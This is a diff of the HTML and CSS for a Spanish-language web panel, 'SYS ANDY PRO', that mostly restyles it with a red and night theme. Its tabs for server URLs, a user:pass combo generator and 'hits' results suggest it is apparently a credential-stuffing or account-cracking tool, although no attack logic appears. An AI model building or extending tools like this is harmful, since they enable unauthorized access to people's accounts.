@@ -3,21 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>SYS ANDY PRO - BLANCO/NEGRO + JUEGO + RESPONSIVE</title>
+    <title>SYS ANDY PRO - LEÓN ROJO + JUEGO + RECUPERACIÓN</title>
     <style>
-        /* ========== NUEVA PALETA BLANCO/NEGRO "ENCENDIDOS" ========== */
+        /* ========== PALETA ORIGINAL LEÓN ROJO + NEGRO (TEMA DÍA) ========== */
         :root {
-            --bg-principal: #ffffff;
-            --bg-tarjeta: #f5f5f5;
-            --bg-inputs: #ffffff;
-            --texto-principal: #000000;
-            --texto-secundario: #333333;
-            --borde-neon: #000000;
-            --fuego-grad: linear-gradient(135deg, #111111, #333333, #000000);
-            --sombra-difusa: 0 0 12px rgba(0,0,0,0.2), 0 0 20px rgba(0,0,0,0.1);
-            --grad-fondo: linear-gradient(145deg, #ffffff, #e0e0e0);
-            --boton-texto: #ffffff;
-            --boton-fondo: #000000;
+            --bg-principal: #000000;
+            --bg-tarjeta: #1a0505;
+            --bg-inputs: #2a0a0a;
+            --texto-principal: #ffdddd;
+            --texto-secundario: #ff8888;
+            --borde-neon: #ff2200;
+            --fuego-grad: linear-gradient(135deg, #ff3300, #990000, #330000);
+            --sombra-difusa: 0 0 20px rgba(255, 34, 0, 0.4), 0 0 40px rgba(128, 0, 0, 0.3);
+            --grad-fondo: radial-gradient(circle at 50% 30%, #2a0000, #000000);
+        }
+
+        /* TEMA NOCHE (alternativo) */
+        body.theme-night {
+            --bg-principal: #0a0f1a;
+            --bg-tarjeta: #111827;
+            --bg-inputs: #1f2a3a;
+            --texto-principal: #ccddff;
+            --texto-secundario: #88aaff;
+            --borde-neon: #3b82f6;
+            --fuego-grad: linear-gradient(135deg, #1e3a8a, #0f172a, #020617);
+            --sombra-difusa: 0 0 20px rgba(59, 130, 246, 0.4), 0 0 40px rgba(0, 0, 128, 0.3);
+            --grad-fondo: radial-gradient(circle at 50% 30%, #0a0f1a, #020617);
         }
 
         body {
@@ -27,589 +38,162 @@
             margin: 0;
             padding: 0;
             min-height: 100vh;
-            transition: all 0.2s;
+            transition: background 0.3s, color 0.2s;
         }
 
-        /* ========== RESPONSIVE MEDIA QUERIES ========== */
+        /* ========== RESPONSIVE ========== */
         @media (max-width: 768px) {
-            .tabs-container {
-                overflow-x: auto;
-                white-space: nowrap;
-                -webkit-overflow-scrolling: touch;
-                scrollbar-width: thin;
-            }
-            .tab-btn {
-                display: inline-block;
-                flex: none;
-                padding: 10px 12px;
-                font-size: 0.9rem;
-            }
-            .auth-box {
-                margin: 10px;
-                padding: 20px;
-            }
-            .navbar {
-                flex-direction: column;
-                gap: 8px;
-                align-items: stretch;
-                text-align: center;
-            }
-            .logo-area {
-                align-items: center;
-            }
-            .panel {
-                padding: 10px;
-            }
-            .item-card, .job-card, .hit-block, .chat-message {
-                padding: 10px;
-            }
-            .chat-messages {
-                height: 300px;
-            }
-            .profile-config {
-                flex-wrap: wrap;
-                justify-content: center;
-            }
-            .btn-block, .btn-small {
-                font-size: 1rem;
-            }
-            .game-area {
-                flex-direction: column;
-                align-items: center;
-            }
-            .moving-btn {
-                width: 80px;
-                height: 80px;
-                font-size: 1.2rem;
-            }
+            .tabs-container { overflow-x: auto; white-space: nowrap; -webkit-overflow-scrolling: touch; }
+            .tab-btn { display: inline-block; flex: none; padding: 10px 12px; }
+            .auth-box { margin: 10px; padding: 20px; }
+            .navbar { flex-direction: column; gap: 8px; align-items: stretch; text-align: center; }
+            .logo-area { align-items: center; }
+            .chat-messages { height: 300px; }
+            .game-area { min-height: 250px; }
+            .moving-btn { width: 80px; height: 80px; font-size: 1.2rem; }
         }
 
         @media (max-width: 480px) {
-            .tab-btn {
-                font-size: 0.75rem;
-                padding: 8px 6px;
-            }
-            .chat-input-area {
-                flex-direction: column;
-            }
-            .chat-input {
-                width: 100%;
-            }
+            .tab-btn { font-size: 0.75rem; padding: 8px 6px; }
+            .chat-input-area { flex-direction: column; }
         }
 
-        /* ========== ELEMENTOS GENERALES ========== */
-        #auth-screen, #main-app {
-            position: relative;
-            z-index: 1;
-        }
-
-        #auth-screen {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 20px;
-            box-sizing: border-box;
-            background: var(--grad-fondo);
-        }
-        .auth-box {
-            background: var(--bg-tarjeta);
-            border: 2px solid var(--borde-neon);
-            border-radius: 30px;
-            padding: 30px;
-            width: 100%;
-            max-width: 400px;
-            box-shadow: var(--sombra-difusa);
-        }
-        .auth-tabs {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-            border-bottom: 1px solid var(--borde-neon);
-        }
-        .auth-tab {
-            flex: 1;
-            background: transparent;
-            border: none;
-            color: var(--texto-secundario);
-            font-weight: bold;
-            padding: 8px;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .auth-tab.active {
-            color: #000000;
-            border-bottom: 3px solid #000000;
-            font-weight: bold;
-        }
-        .auth-panel {
-            display: none;
-        }
-        .auth-panel.active {
-            display: block;
-        }
-
-        /* Modal recuperación */
-        .modal {
-            display: none;
+        /* Resto de estilos (igual que original pero con variables) */
+        body::before {
+            content: "";
             position: fixed;
-            z-index: 1000;
-            left: 0;
             top: 0;
+            left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0,0,0,0.7);
-            backdrop-filter: blur(5px);
-            align-items: center;
-            justify-content: center;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cpath fill='%23ff3311' fill-opacity='0.05' d='M50,15 C30,15 15,30 15,50 C15,70 30,85 50,85 C70,85 85,70 85,50 C85,30 70,15 50,15 Z M50,25 C64,25 75,36 75,50 C75,64 64,75 50,75 C36,75 25,64 25,50 C25,36 36,25 50,25 Z M45,40 L55,40 L55,60 L45,60 Z M40,45 L45,45 L45,55 L40,55 Z M60,45 L55,45 L55,60 L60,55 Z'/%3E%3C/svg%3E");
+            background-repeat: repeat;
+            background-size: 80px;
+            opacity: 0.15;
+            pointer-events: none;
+            z-index: 0;
         }
-        .modal-content {
-            background: white;
-            border: 2px solid black;
-            border-radius: 30px;
-            padding: 25px;
-            width: 90%;
-            max-width: 400px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.3);
-            color: black;
-        }
-        .modal-content h3 { margin-top: 0; text-align: center; }
-        .close-modal {
-            float: right;
-            font-size: 28px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .close-modal:hover { color: gray; }
-
-        #main-app {
-            display: none;
-        }
-
-        .navbar {
-            background: #000000;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 15px;
-            border-bottom: 2px solid #000000;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            flex-wrap: wrap;
-        }
-        .logo-area {
-            display: flex;
-            flex-direction: column;
-        }
-        .logo-title {
-            font-size: 1.6rem;
-            font-weight: bold;
-            background: linear-gradient(135deg, #000000, #333333);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            text-shadow: none;
-        }
-        .logo-title::before {
-            content: "⚡ ";
-            font-size: 1.6rem;
-            background: none;
-            -webkit-background-clip: unset;
-            background-clip: unset;
-            color: #000000;
-        }
-        .logo-sub {
-            font-size: 0.85rem;
-            color: #cccccc;
-        }
-        .btn-salir {
-            background-color: #000000;
-            color: white;
-            border: 1px solid white;
-            padding: 6px 12px;
-            border-radius: 15px;
-            cursor: pointer;
-            font-weight: bold;
-            margin-left: 8px;
-        }
-        .tabs-container {
-            display: flex;
-            background-color: #f0f0f0;
-            border-bottom: 2px solid #000000;
-            overflow-x: auto;
-            white-space: nowrap;
-        }
-        .tab-btn {
-            padding: 12px 16px;
-            background: none;
-            border: none;
-            color: #333;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .tab-btn.active {
-            background: #000000;
-            color: white;
-            border-bottom: 3px solid white;
-        }
-        .badge-pending {
-            background: #000000;
-            color: white;
-            border-radius: 20px;
-            padding: 2px 8px;
-            font-size: 0.7rem;
-            margin-left: 6px;
-        }
-        .panel {
-            padding: 15px;
-            display: none;
-        }
-        .panel.active {
-            display: block;
-        }
-        .sub-tabs {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #000;
-            padding-bottom: 8px;
-            flex-wrap: wrap;
-        }
-        .sub-tab {
-            background: none;
-            border: 1px solid #000;
-            color: #000;
-            font-weight: bold;
-            padding: 6px 15px;
-            cursor: pointer;
-            border-radius: 20px;
-        }
-        .sub-tab.active {
-            background: #000;
-            color: white;
-            box-shadow: 0 0 8px black;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #000;
-            font-weight: bold;
-        }
-        input[type="text"], input[type="password"], input[type="number"], input[type="email"], textarea, select {
-            width: 100%;
-            padding: 10px;
-            background-color: white;
-            border: 2px solid #000;
-            border-radius: 15px;
-            color: black;
-            box-sizing: border-box;
-            font-size: 1rem;
-        }
-        input:focus, textarea:focus, select:focus {
-            border-color: #555;
-            box-shadow: 0 0 8px rgba(0,0,0,0.5);
-            outline: none;
-        }
-        .btn-block, .btn-small, .btn-salir {
-            position: relative;
-            overflow: hidden;
-            transition: transform 0.05s linear, box-shadow 0.1s;
-        }
-        .btn-block:active, .btn-small:active, .btn-salir:active {
-            transform: scale(0.96);
-            box-shadow: 0 0 0 2px white, 0 0 0 4px black;
-        }
-        .btn-block {
-            width: 100%;
-            padding: 12px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            border: none;
-            border-radius: 25px;
-            margin-bottom: 10px;
-            cursor: pointer;
-            color: white;
-            background: #000000;
-            box-shadow: 0 0 8px rgba(0,0,0,0.3);
-        }
-        .btn-start { background: #1a1a1a; }
-        .btn-stop { background: #330000; }
-        .btn-save { background: #222222; }
-        .btn-action { background: #2c2c2c; }
-        .btn-block:disabled { background: #aaa; box-shadow: none; }
-        .item-list { margin-top: 15px; }
-        .item-card {
-            background: #fafafa;
-            border: 2px solid #000;
-            border-radius: 20px;
-            padding: 12px;
-            margin-bottom: 10px;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-        }
-        .item-actions { display: flex; gap: 8px; margin-top: 8px; flex-wrap: wrap; }
-        .btn-small {
-            padding: 6px 12px;
-            font-size: 0.85rem;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            color: white;
-            font-weight: bold;
-            background-color: #000;
-        }
-        .btn-edit { background-color: #333; }
-        .btn-del { background-color: #660000; }
-        .btn-copy { background-color: #006600; }
-        .btn-approve { background-color: #006600; }
-        .btn-reject { background-color: #990000; }
-        .job-card {
-            background: #f5f5f5;
-            border: 2px solid #000;
-            border-radius: 25px;
-            padding: 12px;
-            margin-bottom: 15px;
-        }
-        .job-header { display: flex; justify-content: space-between; font-weight: bold; margin-bottom: 6px; }
-        .yellow-hit { color: #000; font-weight: bold; }
-        .progress-bar-bg {
-            background-color: #ddd;
-            border-radius: 15px;
-            height: 18px;
-            overflow: hidden;
-            border: 1px solid #000;
-        }
-        .progress-bar-fill {
-            background: #000;
-            height: 100%;
-            width: 0%;
-            transition: width 0.3s ease;
-        }
-        .results-title { font-size: 1.2rem; margin-top: 20px; margin-bottom: 10px; font-weight: bold; }
-        #hitsContainer {
-            background: #f5f5f5;
-            padding: 10px;
-            border-radius: 25px;
-            max-height: 300px;
-            overflow-y: auto;
-            border: 2px solid #000;
-        }
-        .hit-block {
-            background: white;
-            border: 2px solid #000;
-            border-radius: 20px;
-            padding: 12px;
-            margin-bottom: 12px;
-        }
-        .hit-header {
-            font-weight: bold;
-            margin-bottom: 5px;
-            border-bottom: 1px solid #000;
-            padding-bottom: 3px;
-            display: flex;
-            justify-content: space-between;
-        }
-        .hit-content {
-            font-family: monospace;
-            white-space: pre-wrap;
-            word-break: break-all;
-            background: #f0f0f0;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 15px;
-        }
-        .counter-badge {
-            background: black;
-            color: white;
-            padding: 2px 8px;
-            border-radius: 25px;
-            font-size: 0.75rem;
-        }
-
-        /* CHAT */
-        .chat-container {
-            background: white;
-            border-radius: 20px;
-            padding: 15px;
-            margin-top: 10px;
-            border: 2px solid #000;
-        }
-        .chat-messages {
-            height: 400px;
-            overflow-y: auto;
-            padding: 10px;
-            background: #fafafa;
-            border-radius: 15px;
-            margin-bottom: 15px;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-        .chat-message {
-            background: #ffffff;
-            border-radius: 15px;
-            padding: 8px 12px;
-            border-left: 5px solid black;
-            position: relative;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-        }
-        .chat-message.replying {
-            border-left: 5px solid #888;
-            background: #eeeeee;
-        }
-        .message-header {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-        .message-avatar { font-size: 1.2rem; background: #ddd; border-radius: 50%; width: 28px; height: 28px; display: inline-flex; align-items: center; justify-content: center; }
-        .message-name { font-weight: bold; color: black; }
-        .message-time { font-size: 0.7rem; color: gray; }
-        .reply-preview {
-            background: #e0e0e0;
-            border-radius: 10px;
-            padding: 5px;
-            margin-bottom: 5px;
-            font-size: 0.8rem;
-            border-left: 3px solid black;
-        }
-        .message-actions {
-            position: absolute;
-            top: 5px;
-            right: 8px;
-            display: flex;
-            gap: 8px;
-            opacity: 0;
-            transition: opacity 0.2s;
-        }
+        #auth-screen, #main-app { position: relative; z-index: 1; }
+        #auth-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; background: var(--grad-fondo); }
+        .auth-box { background: rgba(26, 5, 5, 0.9); backdrop-filter: blur(5px); border: 2px solid var(--borde-neon); border-radius: 30px; padding: 30px; width: 100%; max-width: 400px; box-shadow: var(--sombra-difusa); }
+        .auth-tabs { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid var(--borde-neon); }
+        .auth-tab { flex: 1; background: transparent; border: none; color: var(--texto-secundario); font-weight: bold; padding: 8px; cursor: pointer; }
+        .auth-tab.active { color: #ffaa44; border-bottom: 3px solid #ff4422; }
+        body.theme-night .auth-tab.active { color: #60a5fa; border-bottom-color: #3b82f6; }
+        .auth-panel { display: none; }
+        .auth-panel.active { display: block; }
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); backdrop-filter: blur(8px); align-items: center; justify-content: center; }
+        .modal-content { background: var(--bg-tarjeta); border: 2px solid var(--borde-neon); border-radius: 30px; padding: 25px; width: 90%; max-width: 400px; color: var(--texto-principal); }
+        .close-modal { float: right; font-size: 28px; cursor: pointer; color: #ff8866; }
+        #main-app { display: none; }
+        .navbar { background: linear-gradient(90deg, #1a0000, #330000, #1a0000); display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 2px solid #ff3311; flex-wrap: wrap; }
+        body.theme-night .navbar { background: linear-gradient(90deg, #0f172a, #1e293b, #0f172a); border-bottom-color: #3b82f6; }
+        .logo-title { font-size: 1.6rem; font-weight: bold; background: linear-gradient(135deg, #ff6644, #ff2200); -webkit-background-clip: text; background-clip: text; color: transparent; text-shadow: 0 0 6px #ff3300; }
+        .logo-title::before { content: "🦁 "; font-size: 1.6rem; background: none; color: #ffaa44; }
+        .btn-salir, .btn-theme { background-color: #aa2222; color: white; border: none; padding: 6px 12px; border-radius: 15px; cursor: pointer; margin-left: 8px; }
+        .btn-theme { background-color: #444; }
+        body.theme-night .btn-theme { background-color: #2563eb; }
+        .tabs-container { display: flex; background-color: #1a0505; border-bottom: 2px solid #ff4422; overflow-x: auto; }
+        body.theme-night .tabs-container { background-color: #111827; border-bottom-color: #3b82f6; }
+        .tab-btn { flex: 1; padding: 12px; background: none; border: none; color: #ffaa88; font-weight: bold; cursor: pointer; white-space: nowrap; }
+        .tab-btn.active { color: #ffaa44; border-bottom: 3px solid #ff4422; background: rgba(80, 10, 10, 0.6); text-shadow: 0 0 5px #ff3300; }
+        body.theme-night .tab-btn.active { color: #60a5fa; border-bottom-color: #3b82f6; background: rgba(37, 99, 235, 0.2); }
+        .badge-pending { background: #ff3300; color: white; border-radius: 20px; padding: 2px 8px; font-size: 0.7rem; margin-left: 6px; }
+        .panel { padding: 15px; display: none; }
+        .panel.active { display: block; }
+        .sub-tabs { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #ff4422; flex-wrap: wrap; }
+        .sub-tab { background: none; border: none; color: #ffaa88; padding: 6px 15px; cursor: pointer; border-radius: 20px; }
+        .sub-tab.active { background: #ff4422; color: #000; box-shadow: 0 0 10px #ff4422; }
+        body.theme-night .sub-tab.active { background: #3b82f6; color: white; box-shadow: 0 0 10px #3b82f6; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; color: var(--texto-secundario); font-weight: bold; }
+        input, textarea, select { width: 100%; padding: 10px; background-color: #1f0808; border: 2px solid #aa4422; border-radius: 15px; color: #ffdddd; box-sizing: border-box; }
+        body.theme-night input, body.theme-night textarea { background-color: #0f172a; border-color: #3b82f6; color: #e2e8f0; }
+        .btn-block, .btn-small { position: relative; overflow: hidden; transition: transform 0.05s linear; }
+        .btn-block:active, .btn-small:active { transform: scale(0.96); }
+        .btn-block { width: 100%; padding: 12px; font-size: 1.1rem; font-weight: bold; border: none; border-radius: 25px; margin-bottom: 10px; cursor: pointer; color: white; background: var(--fuego-grad); box-shadow: 0 0 15px #ff3300; }
+        .btn-start { background: linear-gradient(135deg, #00bfa5, #00665a); }
+        .btn-stop { background: linear-gradient(135deg, #d32f2f, #8b0000); }
+        .btn-save { background: linear-gradient(135deg, #ff6f00, #aa3300); }
+        .btn-action { background: linear-gradient(135deg, #ff8833, #cc4400); }
+        .item-card { background: rgba(30, 10, 10, 0.8); backdrop-filter: blur(4px); border: 2px solid #aa4422; border-radius: 20px; padding: 12px; margin-bottom: 10px; }
+        body.theme-night .item-card { background: rgba(17, 24, 39, 0.9); border-color: #3b82f6; }
+        .item-actions { display: flex; gap: 8px; flex-wrap: wrap; }
+        .btn-small { padding: 6px 12px; border-radius: 12px; color: white; background-color: #000; }
+        .job-card { background: rgba(20, 5, 5, 0.9); backdrop-filter: blur(5px); border: 2px solid #ff4422; border-radius: 25px; padding: 12px; margin-bottom: 15px; }
+        .progress-bar-bg { background-color: #2a0a0a; border-radius: 15px; height: 18px; border: 1px solid #ff6644; }
+        .progress-bar-fill { background: linear-gradient(90deg, #ff4422, #ff0000); height: 100%; width: 0%; transition: width 0.3s; }
+        #hitsContainer { background: rgba(30, 5, 5, 0.7); padding: 10px; border-radius: 25px; max-height: 300px; overflow-y: auto; border: 2px solid #ff4422; }
+        .hit-block { background: rgba(0,0,0,0.85); border: 2px solid #ff5533; border-radius: 20px; padding: 12px; margin-bottom: 12px; }
+        .chat-container { background: rgba(0,0,0,0.7); border-radius: 20px; padding: 15px; border: 2px solid #ff4422; }
+        .chat-messages { height: 400px; overflow-y: auto; background: #1a0303; border-radius: 15px; margin-bottom: 15px; }
+        .chat-message { background: #2a0a0a; border-radius: 15px; padding: 8px 12px; border-left: 5px solid var(--user-color, #ff8844); position: relative; }
+        .message-actions { position: absolute; top: 5px; right: 8px; opacity: 0; transition: opacity 0.2s; }
         .chat-message:hover .message-actions { opacity: 1; }
-        .msg-btn { background: none; border: none; color: #333; cursor: pointer; }
-        .chat-input-area { display: flex; gap: 10px; align-items: flex-end; flex-wrap: wrap; }
-        .chat-input { flex: 1; background: white; border: 2px solid #000; border-radius: 25px; padding: 10px 15px; color: black; resize: none; }
-        .reply-badge { background: black; color: white; border-radius: 20px; padding: 4px 10px; display: inline-flex; align-items: center; gap: 8px; margin-bottom: 5px; }
-        .profile-config { background: #f5f5f5; border-radius: 20px; padding: 10px; margin-bottom: 15px; display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
-        .avatar-select { font-size: 1.5rem; background: #ddd; border-radius: 50%; width: 40px; height: 40px; text-align: center; line-height: 40px; cursor: pointer; }
-        .mention { background: black; color: white; border-radius: 12px; padding: 0 5px; cursor: pointer; }
-
-        /* ========== JUEGO CLICK RÁPIDO ========== */
-        .game-container {
-            background: #f0f0f0;
-            border-radius: 30px;
-            padding: 20px;
-            text-align: center;
-            border: 2px solid black;
-        }
-        .game-stats {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 20px;
-            font-size: 1.5rem;
-            font-weight: bold;
-        }
-        .game-area {
-            position: relative;
-            background: #ffffff;
-            border-radius: 30px;
-            border: 2px dashed black;
-            min-height: 300px;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .moving-btn {
-            position: absolute;
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            background: black;
-            color: white;
-            font-size: 1.5rem;
-            font-weight: bold;
-            border: none;
-            cursor: pointer;
-            transition: all 0.05s ease;
-            box-shadow: 0 0 12px rgba(0,0,0,0.5);
-        }
-        .moving-btn:active {
-            transform: scale(0.9);
-        }
-        .game-controls {
-            margin-top: 15px;
-        }
-        .reset-game {
-            background: black;
-            color: white;
-            padding: 8px 20px;
-            border: none;
-            border-radius: 40px;
-            font-size: 1rem;
-            cursor: pointer;
-        }
+        /* JUEGO */
+        .game-container { background: rgba(0,0,0,0.6); border-radius: 30px; padding: 20px; border: 2px solid #ff4422; }
+        .game-stats { display: flex; justify-content: space-between; margin-bottom: 20px; font-size: 1.5rem; font-weight: bold; }
+        .game-area { position: relative; background: rgba(0,0,0,0.4); border-radius: 30px; border: 2px dashed #ff4422; min-height: 300px; margin-bottom: 20px; }
+        .moving-btn { position: absolute; width: 100px; height: 100px; border-radius: 50%; background: #ff4422; color: white; font-size: 1.5rem; border: none; cursor: pointer; box-shadow: 0 0 12px #ff3300; transition: all 0.05s; }
+        .moving-btn:active { transform: scale(0.9); }
+        .reset-game { background: #ff4422; color: black; padding: 8px 20px; border: none; border-radius: 40px; cursor: pointer; }
     </style>
-    
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/emailjs.min.js"></script>
 </head>
 <body>
 
 <div id="auth-screen">
     <div class="auth-box">
-        <h2 style="text-align:center; font-weight:bold;">⚡ SYS ANDY PRO</h2>
+        <h2 style="text-align:center;background:linear-gradient(135deg,#ff5533,#aa1100);-webkit-background-clip:text;background-clip:text;color:transparent;">🦁 SYS ANDY PRO</h2>
         <div class="auth-tabs">
             <button class="auth-tab active" data-auth="login">🔐 Iniciar Sesión</button>
             <button class="auth-tab" data-auth="register">📝 Registrarse</button>
         </div>
         <div id="auth-login" class="auth-panel active">
-            <div class="form-group"><label>Usuario o Correo Electrónico:</label><input type="text" id="loginEmail" placeholder="ej: usuario@ejemplo.com"></div>
-            <div class="form-group"><label>Contraseña:</label><input type="password" id="loginPass" placeholder="••••••••"></div>
-            <button class="btn-block btn-start" onclick="procesarLogin()">INGRESAR AL SISTEMA</button>
-            <div style="text-align:center; margin-top:12px;"><a href="#" id="forgotPasswordLink" style="color:black;">¿Olvidaste tu contraseña?</a></div>
+            <div class="form-group"><label>Usuario o Correo:</label><input type="text" id="loginEmail" placeholder="usuario@ejemplo.com"></div>
+            <div class="form-group"><label>Contraseña:</label><input type="password" id="loginPass"></div>
+            <button class="btn-block btn-start" onclick="procesarLogin()">INGRESAR</button>
+            <div style="text-align:center; margin-top:12px;"><a href="#" id="forgotPasswordLink" style="color:#ffaa66;">¿Olvidaste tu contraseña?</a></div>
         </div>
         <div id="auth-register" class="auth-panel">
-            <div class="form-group"><label>Correo Electrónico:</label><input type="email" id="regEmail" placeholder="usuario@ejemplo.com"></div>
-            <div class="form-group"><label>Contraseña:</label><input type="password" id="regPass" placeholder="mínimo 4 caracteres"></div>
-            <div class="form-group"><label>Confirmar Contraseña:</label><input type="password" id="regPassConfirm" placeholder="repita contraseña"></div>
-            <div class="form-group"><label>Nombre en el chat (opcional):</label><input type="text" id="regDisplayName" placeholder="Como te verán"></div>
+            <div class="form-group"><label>Correo:</label><input type="email" id="regEmail"></div>
+            <div class="form-group"><label>Contraseña:</label><input type="password" id="regPass"></div>
+            <div class="form-group"><label>Confirmar:</label><input type="password" id="regPassConfirm"></div>
+            <div class="form-group"><label>Nombre chat:</label><input type="text" id="regDisplayName"></div>
             <button class="btn-block btn-save" onclick="solicitarRegistro()">📨 ENVIAR SOLICITUD</button>
-            <p style="font-size:0.75rem; text-align:center;">Tu solicitud será revisada por el administrador.</p>
+            <p style="font-size:0.75rem; text-align:center;">Será revisada por el administrador.</p>
         </div>
     </div>
 </div>
 
-<!-- Modal recuperación -->
 <div id="resetModal" class="modal">
     <div class="modal-content">
         <span class="close-modal">&times;</span>
         <h3>🔐 Recuperar contraseña</h3>
         <div id="resetStep1">
-            <div class="form-group"><label>Correo electrónico registrado:</label><input type="email" id="resetEmail" placeholder="tu@email.com"></div>
+            <div class="form-group"><label>Correo:</label><input type="email" id="resetEmail"></div>
             <button class="btn-block btn-start" onclick="solicitarCodigoReset()">📧 Enviar código</button>
         </div>
         <div id="resetStep2" style="display:none;">
-            <div class="form-group"><label>Código (6 dígitos):</label><input type="text" id="resetCode" maxlength="6"></div>
-            <div class="form-group"><label>Nueva contraseña:</label><input type="password" id="newPassword" placeholder="mínimo 4 caracteres"></div>
+            <div class="form-group"><label>Código:</label><input type="text" id="resetCode" maxlength="6"></div>
+            <div class="form-group"><label>Nueva contraseña:</label><input type="password" id="newPassword"></div>
             <div class="form-group"><label>Confirmar:</label><input type="password" id="confirmNewPassword"></div>
-            <button class="btn-block btn-save" onclick="verificarCodigoYResetear()">✅ Restablecer</button>
+            <button class="btn-block btn-save" onclick="verificarCodigoYResetear()">Restablecer</button>
         </div>
-        <div id="resetMsg" style="margin-top:10px; font-size:0.85rem; text-align:center;"></div>
+        <div id="resetMsg" style="margin-top:10px; text-align:center;"></div>
     </div>
 </div>
 
 <div id="main-app">
     <div class="navbar">
-        <div class="logo-area">
-            <span class="logo-title">SYS ANDY PRO</span>
-            <span class="logo-sub" id="userDisplay">Cargando...</span>
+        <div class="logo-area"><span class="logo-title">SYS ANDY PRO</span><span class="logo-sub" id="userDisplay">Cargando...</span></div>
+        <div style="display: flex;">
+            <button class="btn-theme" onclick="toggleTheme()">🌓 DÍA/NOCHE</button>
+            <button class="btn-salir" onclick="cerrarSesion()">SALIR</button>
         </div>
-        <button class="btn-salir" onclick="cerrarSesion()">SALIR</button>
     </div>
-
     <div class="tabs-container">
         <button class="tab-btn" onclick="switchTab('bloc')">📝 BLOC URLS</button>
         <button class="tab-btn" onclick="switchTab('combos')">📦 COMBOS</button>
@@ -621,106 +205,75 @@
         <button class="tab-btn" onclick="switchTab('juego')">🎮 JUEGO</button>
     </div>
 
-    <!-- PANEL BLOC URLS -->
+    <!-- BLOC URLS -->
     <div id="panel-bloc" class="panel">
-        <h3>Bloc de Servidores & URLs</h3>
-        <div class="item-card">
-            <input type="hidden" id="editUrlId" value="">
-            <div class="form-group"><label id="lblUrlForm">Agregar nueva URL / Host:</label><input type="text" id="inputUrlData" placeholder="ejemplo.com:8080 - Servidor"></div>
-            <button class="btn-block btn-action" onclick="guardarUrlBloc()">GUARDAR URL</button>
-        </div>
-        <div class="item-list" id="listaUrlsContainer"></div>
+        <h3>Bloc de Servidores</h3>
+        <div class="item-card"><input type="hidden" id="editUrlId"><div class="form-group"><label>URL:</label><input type="text" id="inputUrlData" placeholder="ejemplo.com:8080 - Servidor"></div><button class="btn-block btn-action" onclick="guardarUrlBloc()">GUARDAR</button></div>
+        <div id="listaUrlsContainer" class="item-list"></div>
     </div>
 
-    <!-- PANEL COMBOS -->
+    <!-- COMBOS (resumido pero funcional igual que original) -->
     <div id="panel-combos" class="panel">
         <h3>📦 HERRAMIENTA DE COMBOS</h3>
-        <div class="sub-tabs">
-            <button class="sub-tab active" data-sub="generator">Generador</button>
-            <button class="sub-tab" data-sub="merge">Unir Combos</button>
-            <button class="sub-tab" data-sub="dedupe">Eliminar Duplicados</button>
-        </div>
+        <div class="sub-tabs"><button class="sub-tab active" data-sub="generator">Generador</button><button class="sub-tab" data-sub="merge">Unir Combos</button><button class="sub-tab" data-sub="dedupe">Eliminar Duplicados</button></div>
         <div id="sub-generator" class="sub-panel active">
-            <div class="form-group"><label>Tipo:</label><select id="genType">...</select></div>
+            <div class="form-group"><label>Tipo:</label><select id="genType"><option value="userpass_ano">User:Pass (1996-2050)</option><option value="useruser">User:User</option><option value="alfanumericos">Alfanuméricos</option></select></div>
             <div class="form-group"><label>Cantidad:</label><input type="number" id="genCantidad" value="100"></div>
             <div class="form-group"><label>Longitud pass:</label><input type="number" id="genPassLength" value="8"></div>
             <div class="form-group"><label>Separador:</label><select id="genSep"><option>:</option><option>|</option></select></div>
-            <div class="form-group"><label>Formato usuario:</label><select id="genUserCase">...</select></div>
-            <div class="form-group"><label>Formato pass:</label><select id="genPassCase">...</select></div>
-            <button class="btn-block btn-start" onclick="generarComboAvanzado()">⚡ GENERAR</button>
-            <textarea id="comboResultado" rows="10" readonly></textarea>
-            <button id="btnDescargarComboGen" class="btn-block btn-save" disabled onclick="descargarComboGenerado()">⬇️ DESCARGAR</button>
+            <button class="btn-block btn-start" onclick="generarComboAvanzado()">GENERAR</button>
+            <textarea id="comboResultado" rows="8" readonly></textarea>
